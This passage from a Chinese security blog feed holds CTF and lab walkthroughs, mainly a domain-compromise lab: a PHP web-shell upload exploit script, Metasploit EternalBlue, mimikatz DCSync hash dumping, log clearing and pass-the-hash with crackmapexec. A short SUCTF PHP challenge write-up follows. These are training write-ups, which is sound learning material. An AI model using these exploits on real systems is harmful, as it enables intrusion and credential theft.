class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br><br>data1 = &#123;<br>    <span class="hljs-string">&#x27;rempass&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;jmpass&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>    <span class="hljs-string">&#x27;device&#x27;</span>: <span class="hljs-string">&#x27;1625884034525&#x27;</span>,<br>    <span class="hljs-string">&#x27;ltype&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminuser&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4=&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminpass&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4xMjM=&#x27;</span>,<br>    <span class="hljs-string">&#x27;yanzm&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>&#125;<br><br><br>r = session.post(url1, data=data1)<br>r = session.post(url2, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>, <span class="hljs-string">&#x27;r+&#x27;</span>)&#125;)<br><br>filepath = <span class="hljs-built_in">str</span>(r.json()[<span class="hljs-string">&#x27;filepath&#x27;</span>])<br>filepath = <span class="hljs-string">&quot;/&quot;</span> + filepath.split(<span class="hljs-string">&#x27;.uptemp&#x27;</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.php&#x27;</span><br><span class="hljs-built_in">id</span> = r.json()[<span class="hljs-string">&#x27;id&#x27;</span>]<br><br>url3 = url_pre + <span class="hljs-string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&#x27;</span><br><br>r = session.get(url3)<br>r = session.get(url_pre + filepath + <span class="hljs-string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 1.php</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;1&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行exp即可获得文件上传的路径</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\Hesyer\Desktop\道具\脚本&gt; python <span class="hljs-literal">-u</span> <span class="hljs-string">&quot;c:\Users\Hesyer\Desktop\道具\脚本\exp.py&quot;</span><br>&lt;br /&gt;<br>&lt;b&gt;Notice&lt;/b&gt;:  Undefined offset: <span class="hljs-number">1</span> <span class="hljs-keyword">in</span> &lt;b&gt;C:\phpStudy\PHPTutorial\WWW\upload\<span class="hljs-number">2024</span><span class="hljs-literal">-10</span>\<span class="hljs-number">27</span>_17552986.php&lt;/b&gt; on line &lt;b&gt;<span class="hljs-number">1</span>&lt;/b&gt;&lt;br /&gt;<br></code></pre></td></tr></table></figure><p>拼接路径后url为<code>http://172.22.1.18/upload/2024-10/27_17552986.php</code></p><p>然后用蚁剑连接</p><p>在<code>Administrator</code>用户目录下找到 flag2</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">C:/Users/Administrator/flag/flag02.txt</span><br>___    ___ ___  ________  ________  ________  ________  ________   ________     <br>|\  \  /  /|\  \|\   __  \|\   __  \|\   __  \|\   __  \|\   ___  \|\   ____\    <br>\ \  \/  / | \  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \\ \  \ \  \___|    <br> \ \    / / \ \  \ \   __  \ \  \\\  \ \   _  _\ \   __  \ \  \\ \  \ \  \  ___  <br>  /     \/   \ \  \ \  \ \  \ \  \\\  \ \  \\  \\ \  \ \  \ \  \\ \  \ \  \|\  \ <br> /  /\   \    \ \__\ \__\ \__\ \_______\ \__\\ _\\ \__\ \__\ \__\\ \__\ \_______\<br>/__/ /\ __\    \|__|\|__|\|__|\|_______|\|__|\|__|\|__|\|__|\|__| \|__|\|_______|<br>|__|/ \|__|                                                                      <br><br><br>flag02: 2ce3-4813-87d4-<br><br>Awesome! ! ! You found the second flag, now you can attack the domain controller.<br></code></pre></td></tr></table></figure><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>接下来在kali中使用<code>Metasploit Framework</code>攻击存在<code>ms17-010</code>(永恒之蓝)的<code>172.22.1.21</code></p><p>首先在kali里配置<code>proxychains4</code>(linux命令行代理神器)</p><p>在<code>/etc/proxychains4.conf</code>文件中最下面的ProxyList上加上<code>socks5 ip 端口</code> 即可</p><p>这里的IP是vm虚拟机nat模式(我的kali的虚拟机网络连接模式)下本机的ip</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[ProxyList]</span><br>socks5 192.168.241.1 1080<br></code></pre></td></tr></table></figure><p>vm虚拟机nat模式下本机的ip可以在本机中用<code>ipconfig</code>命令查看，在<code>VMware Network Adapter VMnet8</code>里</p><p><em>这里最好测试一下kali虚拟机能否ping通这个ip，如果ping不通，上面设置的代理是无效的，</em></p><blockquote><p>解决方法是打开Windows防火墙—–&gt;高级设置—–&gt;入站规则，找到配置文件类型为“公用”的“文件和打印共享（回显请求 – ICMPv4-In）”规则，设置为允许</p></blockquote><p>然后命令行执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 -q bash<br></code></pre></td></tr></table></figure><p>这将以静默模式打开一个新的 <code>bash</code> 会话，所有在这个会话中输入的命令都将自动通过 <code>proxychains4</code> 代理执行，</p><p>静默模式下proxychains4的大量初始化信息将被隐藏</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># msfconsole</span><br>Metasploit tip: Use <span class="hljs-built_in">help</span> &lt;<span class="hljs-built_in">command</span>&gt; to learn more about any <span class="hljs-built_in">command</span><br>                                                  <br><br>      .:okOOOkdc<span class="hljs-string">&#x27;           &#x27;</span>cdkOOOko:.<br>    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.<br>   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:<br>  <span class="hljs-string">&#x27;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&#x27;</span><br>  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo<br>  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx<br>  lOOOOOOOO.         ;d;         ,OOOOOOOOl<br>  .OOOOOOOO.   .;           ;    ,OOOOOOOO.<br>   cOOOOOOO.   .OOc.     <span class="hljs-string">&#x27;oOO.   ,OOOOOOOc</span><br><span class="hljs-string">    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo</span><br><span class="hljs-string">     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl</span><br><span class="hljs-string">      ;OOOO&#x27;</span>   .OOOO.   :OOOO.   ;OOOO;<br>       .dOOo   .OOOOocccxOOOO.   xOOd.<br>         ,kOl  .OOOOOOOOOOOOO. .dOk,<br>           :kk;.OOOOOOOOOOOOO.cOk:<br>             ;kOOOOOOOOOOOOOOOk:<br>               ,xOOOOOOOOOOOx,<br>                 .lOOOOOOOl.<br>                    ,dOd,<br>                      .<br><br>       =[ metasploit v6.4.32-dev                          ]<br>+ -- --=[ 2459 exploits - 1266 auxiliary - 430 post       ]<br>+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]<br>+ -- --=[ 9 evasion                                       ]<br><br>Metasploit Documentation: https://docs.metasploit.com/<br><br>msf6 &gt; search ms17-010<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#   Name                                           Disclosure Date  Rank     Check  Description</span><br>   -   ----                                           ---------------  ----     -----  -----------<br>   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption<br>   1     \_ target: Automatic Target                  .                .        .      .<br>   2     \_ target: Windows 7                         .                .        .      .<br>   3     \_ target: Windows Embedded Standard 7       .                .        .      .<br>   4     \_ target: Windows Server 2008 R2            .                .        .      .<br>   5     \_ target: Windows 8                         .                .        .      .<br>   6     \_ target: Windows 8.1                       .                .        .      .<br>   7     \_ target: Windows Server 2012               .                .        .      .<br>   8     \_ target: Windows 10 Pro                    .                .        .      .<br>   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .<br>   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution<br>   11    \_ target: Automatic                         .                .        .      .<br>   12    \_ target: PowerShell                        .                .        .      .<br>   13    \_ target: Native upload                     .                .        .      .<br>   14    \_ target: MOF upload                        .                .        .      .<br>   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .<br>   16    \_ AKA: ETERNALROMANCE                       .                .        .      .<br>   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .<br>   18    \_ AKA: ETERNALBLUE                          .                .        .      .<br>   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution<br>   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .<br>   21    \_ AKA: ETERNALROMANCE                       .                .        .      .<br>   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .<br>   23    \_ AKA: ETERNALBLUE                          .                .        .      .<br>   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection<br>   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .<br>   26    \_ AKA: ETERNALBLUE                          .                .        .      .<br>   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution<br>   28    \_ target: Execute payload (x64)             .                .        .      .<br>   29    \_ target: Neutralize implant                .                .        .      .<br><br><br>Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce<br>After interacting with a module you can manually <span class="hljs-built_in">set</span> a TARGET with <span class="hljs-built_in">set</span> TARGET <span class="hljs-string">&#x27;Neutralize implant&#x27;</span><br></code></pre></td></tr></table></figure><p>第一个模块影响版本比较多，所以使用它进行后续操作</p><p>依次输入以下命令发起永恒之蓝攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue  <span class="hljs-comment"># 选择使用的模块</span><br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid  <span class="hljs-comment"># 设置payload，可以通过show payloads查看</span><br><span class="hljs-built_in">set</span> RHOSTS 172.22.1.21  <span class="hljs-comment"># 设置靶机的ip</span><br>exploit  <span class="hljs-comment"># 发起攻击</span><br></code></pre></td></tr></table></figure><p>运行成功会出现<code>meterpreter&gt;</code></p><p>该<code>Meterpreter</code>是<code>metasploit</code>的一个扩展模块，可以调用<code>metasploit</code>的一些功能，对目标系统进行更深入的渗透，入获取屏幕、上传/下载文件、创建持久后门等</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 介绍一些该模块常用的命令</span><br>meterpreter &gt; screenshot <span class="hljs-comment"># 捕获屏幕</span><br>meterpreter &gt; upload hello.txt c:// <span class="hljs-comment">#上传文件</span><br>meterpreter &gt; download d://1.txt <span class="hljs-comment"># 下载文件</span><br>meterpreter &gt; shell <span class="hljs-comment"># 获取cmd</span><br>meterpreter &gt; clearev <span class="hljs-comment"># 清除日志</span><br></code></pre></td></tr></table></figure><p>虽然打入了该主机，但此主机上并无flag,最后的flag在windows DC 域控制器里</p><p>接下来需要通过<code>DCSync</code>来导出所有用户的 hash </p><blockquote><p>DC（Domain Controller，域控制器）是 Windows 域网络架构中的核心服务器，</p><p>负责管理并维护域中的所有用户、计算机、组和策略等信息。</p><p>在企业环境中，域控制器主要通过 Active Directory（AD）来管理和验证用户身份，实现资源的集中控制和网络安全管理。</p></blockquote><blockquote><p>DCSync 攻击基于微软的 Active Directory 复制协议（Directory Replication Service，DRS）。</p><p>在 Windows 域中，多个域控制器（DC）之间会进行数据同步，以确保所有 DC 拥有一致的用户凭据、组策略和其他目录信息。</p><p>DCSync 攻击的关键在于，攻击者可以伪装成一个域控制器，通过 DRS 协议向其他域控制器请求复制敏感的身份数据。</p><p>具体来说，DCSync 攻击会模拟一个合法的域控制器发起同步请求。其他域控制器在收到请求时，会按照 Active Directory 复制机制，将存储的凭据信息传送给请求者，而攻击者便可以利用该机制轻松获得：</p><ul><li>用户的 NTLM 哈希：用于解密或破解用户密码。</li><li>Kerberos 密钥（AES 哈希）：用于生成 Kerberos 票证。</li><li>Kerberos TGT 密钥：可用于持久性攻击，创建伪造的 TGT（Ticket Granting Ticket）。</li></ul></blockquote><blockquote><p>DCSync 攻击要求攻击者获得相当高的权限才能执行。以下是实现 DCSync 攻击的主要前提：</p><ul><li><strong>域管理员（Domain Admins）或企业管理员（Enterprise Admins）权限</strong>：通常只有域管理员才有足够的权限发起 DRS 请求以提取凭据。</li><li><strong>获取到管理权限的账户（如 <code>Replicator</code> 组）</strong>：具备特定权限的用户或服务账户也可能拥有域复制权限。</li></ul></blockquote><p>然后进行哈希传递攻击实现<code>DC</code>上的任意命令执行</p><blockquote><p>在 Windows 系统中，身份验证过程使用 NTLM 哈希来验证用户身份。</p><p>当用户登录时，系统会生成用户的 NTLM 哈希并将其发送给身份验证服务（如域控制器），以确认用户的身份。</p><p>而在 Pass-the-Hash 哈希传递攻击中，攻击者获取到 NTLM 哈希后，直接使用该哈希来模拟登录，不需要知道密码的明文：</p><ul><li><strong>获取凭据哈希</strong>：攻击者首先在目标系统上通过技术手段（如内存提取、Mimikatz 工具、或 NTLM 哈希窃取工具）获得用户的 NTLM 哈希值。</li><li><strong>伪装身份登录</strong>：攻击者在其他系统上使用该哈希进行身份验证，以便模拟被攻击用户的身份完成登录。此时身份验证服务会认为攻击者是该用户，因为哈希值有效。</li></ul></blockquote><p>输入以下命令来获取用户的 hash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">load kiwi  # 调用mimikatz模块，mimikatz是一款著名的内存提取工具，可以用于获取密码明文、哈希值、Kerberos 票证等<br>kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit  # 导出域内所有用户的信息(包括哈希值)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; load kiwi<br>Loading extension kiwi...<br>  .<span class="hljs-comment">#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><br> .<span class="hljs-comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br> <span class="hljs-comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br> <span class="hljs-comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br> <span class="hljs-string">&#x27;## v ##&#x27;</span>        Vincent LE TOUX            ( vincent.letoux@gmail.com )<br>  <span class="hljs-string">&#x27;#####&#x27;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/<br><br>Success.<br>meterpreter &gt; kiwi_cmd <span class="hljs-string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="hljs-built_in">exit</span><br>[DC] <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span> will be the domain<br>[DC] <span class="hljs-string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server<br>[DC] Exporting domain <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span><br>[rpc] Service  : ldap<br>[rpc] AuthnSvc : GSS_NEGOTIATE (9)<br>502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514<br>1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512<br>1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512<br>1000    DC01$   65bfc1d9a84f50b1459c71db9b06d31a        532480<br>500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512<br>1104    XIAORANG-OA01$  23365b4993b59801527157c04c58b057        4096<br>1108    XIAORANG-WIN7$  b705f720ab6702d623f854bbf3299d22        4096<br><br>mimikatz(powershell) <span class="hljs-comment"># exit</span><br>Bye!<br></code></pre></td></tr></table></figure><p>提取<code>Administrator</code>用户的 hash</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Administrator</span>   <span class="hljs-number">10</span>cf89a850fb1cdbe6bb432b859164c8<br></code></pre></td></tr></table></figure><p>使用<code>crackmapexec</code>来进行哈希传递攻击</p><p><code>crackmapexec</code> 是一个渗透测试工具，用于测试 SMB、SSH、LDAP 等服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="hljs-string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br>SMB         172.22.1.2      445    DC01             [*] Windows Server 2016 Datacenter 14393 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:True)<br>SMB         172.22.1.2      445    DC01             [+] xiaorang.lab\administrator:10cf89a850fb1cdbe6bb432b859164c8 (Pwn3d!)<br>SMB         172.22.1.2      445    DC01             [+] Executed <span class="hljs-built_in">command</span> <br>SMB         172.22.1.2      445    DC01             ___   ___<br>SMB         172.22.1.2      445    DC01             \\ / /       / /    // | |     //   ) ) //   ) )  // | |     /|    / / //   ) )<br>SMB         172.22.1.2      445    DC01             \  /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //<br>SMB         172.22.1.2      445    DC01             / /       / /    / ___  |   //   / / / ___ (   / ___  |   // |  / / //  ____<br>SMB         172.22.1.2      445    DC01             / /\\     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /<br>SMB         172.22.1.2      445    DC01             / /  \\ __/ /___ //     | | ((___/ / //    | | //     | | //   |/ / ((____/ /<br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             <br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             <br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             flag03: e8f88d0d43d6&#125;<br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             <br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             Unbelievable! ! You found the last flag, which means you have full control over the entire domain network.<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://chimedal.github.io/2024/09/22/Initial/index.html">春秋云境-Initial | Chimedal</a></p><p><a href="https://qanux.github.io/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/index.html">春秋云境Initial详解 | Qanux’s space</a></p><p><a href="https://blog.csdn.net/weixin_63576152/article/details/133462469">春秋云境Initial-WP（附带详细代理过程）_172.22.1.18v-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_32393893/article/details/110389330">工具之使用教程Neo-reGeorg_neoregeorg-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_41538012/article/details/115325944">超详细虚拟机与主机网络连接以及互Ping不通问题的解决_桥接模式windows2008虚拟机ping主机-CSDN博客</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SUCTF2018 annonymous</title>
    <link href="/2024/07/28/SUCTF2018-annonymous/"/>
    <url>/2024/07/28/SUCTF2018-annonymous/</url>
    
    <content type="html"><![CDATA[<h1 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$MY</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);   <span class="hljs-comment">//创建匿名函数</span><br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-number">32</span>));   <span class="hljs-comment">//生成随机哈希值</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function SUCTF_<span class="hljs-subst">$hash</span>()&#123;&quot;</span>               <span class="hljs-comment">//定义一个函数</span><br>    .<span class="hljs-string">&quot;global \$MY;&quot;</span><br>    .<span class="hljs-string">&quot;\$MY();&quot;</span><br>    .<span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func_name&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func_name&quot;</span>]();<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>目的很明确</p><p>用<code>$_GET[&quot;func_name&quot;]();</code> 通过执行<code>SUCTF_$hash()</code>进而执行 <code>$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);</code>创建的匿名函数</p><p>但是<code>$hash</code>得不到，无法执行<code>SUCTF_$hash()</code></p><p><code>create_function()</code>函数在创建之后会生成一个函数名为：<code>%00lambda_[1-···] </code>  后面的数字是递增的</p><p>因此创建的匿名函数其实是有名字的，例如<code>%00lambda_1</code> 、<code>%00lambda_13  </code> 、<code> %00lambda_55</code></p><p>因此可以绕过<code>SUCTF_$hash()</code>，直接执行匿名函数</p><p>这里有两种方法，</p><p>第一种是直接爆破，这个很简单就不多说了</p><p>第二种是通过大量的请求来迫使<code>Pre-fork</code>模式启动，Apache启动新的线程，这样这里的函数名后面的数字会刷新为1</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Apache服务器的<code>Pre-fork</code>模式意味着在服务器启动时，就会预先创建一定数量的子进程（工作进程），用于处理客户端的请求。</p><p>我们可以通过发送大量请求来增加服务器的负载。</p><p>如果请求足够多，将会耗尽所有预先创建的子进程。</p><p>这时，Apache服务器会启动新的子进程来处理额外的负载</p><p>启动新的子进程时，用于生成函数名的计数器将会重置</p><p><code>%00lambda_[1-···] </code>  后面的数字会从1开始重新计数。</p><p><img src="https://s2.loli.net/2024/07/28/h4vr8KjOyecHRga.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯2019 Upload</title>
    <link href="/2024/07/22/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF2019%5D%20Upload/"/>
    <url>/2024/07/22/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF2019%5D%20Upload/</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯2019-Upload"><a href="#强网杯2019-Upload" class="headerlink" title="强网杯2019 Upload"></a>强网杯2019 Upload</h1><p>目录扫描发现源码泄露 <code>www.tar.gz</code></p><p>直接看文件上传部分的关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;checker)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable language_">$this</span>-&gt;checker-&gt;<span class="hljs-title function_ invoke__">login_check</span>())&#123;       <span class="hljs-comment">#登录检测，登录后才能进行文件上传操作</span><br>            <span class="hljs-variable">$curr_url</span>=<span class="hljs-string">&quot;http://&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span 